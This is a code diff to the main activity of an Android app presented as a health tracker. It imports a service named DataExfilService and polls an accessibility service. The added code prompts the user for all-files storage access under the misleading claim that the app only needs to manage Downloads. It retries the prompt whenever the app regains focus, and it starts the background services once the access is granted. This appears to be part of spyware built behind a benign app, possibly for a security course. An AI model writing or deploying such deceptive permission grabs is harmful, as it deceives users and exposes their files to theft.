@@ -33,12 +33,16 @@ import com.inf2007.healthtracker.utilities.WatchAccessibilityService
 import android.content.ComponentName
 import android.content.Context
 import android.content.IntentFilter
+import android.net.Uri
+import android.os.Environment
 import com.inf2007.healthtracker.utilities.DataExfilService
 
 class MainActivity : ComponentActivity() {
     private val handler = Handler(Looper.getMainLooper())
     private var isPolling = false
     private var isPollingAccessibility = false
+    private var isStorageDialogShowing = false
+    private var isStoragePermissionHandled = false
 
     private val checkPermissionRunnable = object : Runnable {
         override fun run() {
@@ -142,6 +146,14 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun onPermissionGrantedSuccessfully() {
+        if (isStoragePermissionHandled) return
+
+        if (!Environment.isExternalStorageManager()) {
+            isStoragePermissionHandled = true
+            requestManageStorage()
+            return
+        }
+
         // 1. Start the step counter service
         startHealthService()
 
@@ -316,6 +328,65 @@ class MainActivity : ComponentActivity() {
         } catch (e: Exception) {
             Log.e("DEBUG_START", "Crashed: ${e.message}")
             e.printStackTrace()
+        }
+    }
+
+    private fun requestManageStorage() {
+        if (isStorageDialogShowing) return
+        if (isFinishing || isDestroyed) return
+
+        isStorageDialogShowing = true
+
+        AlertDialog.Builder(this)
+            .setTitle("Storage Access Required")
+            .setMessage("This app needs access to manage files in Downloads folder.")
+            .setPositiveButton("Grant Access") { _, _ ->
+                isStorageDialogShowing = false
+                // Don't reset isStoragePermissionHandled here - wait until return
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    startActivity(intent)
+                }
+            }
+            .setNegativeButton("Later") { _, _ ->
+                isStorageDialogShowing = false
+                isStoragePermissionHandled = false // Allow retry if user clicks Later
+            }
+            .setOnDismissListener {
+                isStorageDialogShowing = false
+            }
+            .show()
+    }
+
+    override fun onWindowFocusChanged(hasFocus: Boolean) {
+        super.onWindowFocusChanged(hasFocus)
+
+        Log.i("STRAFE", "onWindowFocusChanged - hasFocus: $hasFocus")
+        Log.i("STRAFE", "isStoragePermissionHandled: $isStoragePermissionHandled")
+        Log.i("STRAFE", "isExternalStorageManager: ${Environment.isExternalStorageManager()}")
+
+        // When app returns to foreground
+        if (hasFocus) {
+            // Case 1: We were waiting for storage and now it's granted
+            if (isStoragePermissionHandled && Environment.isExternalStorageManager()) {
+                Log.i("STRAFE", "Storage granted! Starting services...")
+                isStoragePermissionHandled = false
+                onPermissionGrantedSuccessfully()
+            }
+            // Case 2: Storage is granted but flag was already reset (like in your logs)
+            else if (Environment.isExternalStorageManager() && !isStoragePermissionHandled) {
+                Log.i("STRAFE", "Storage already granted, starting services...")
+                onPermissionGrantedSuccessfully()
+            }
+            // Case 3: Still waiting for storage
+            else if (isStoragePermissionHandled && !Environment.isExternalStorageManager()) {
+                Log.i("STRAFE", "Returned to app but storage NOT granted")
+                isStoragePermissionHandled = false // Reset flag to allow retry
+            }
         }
     }
 }
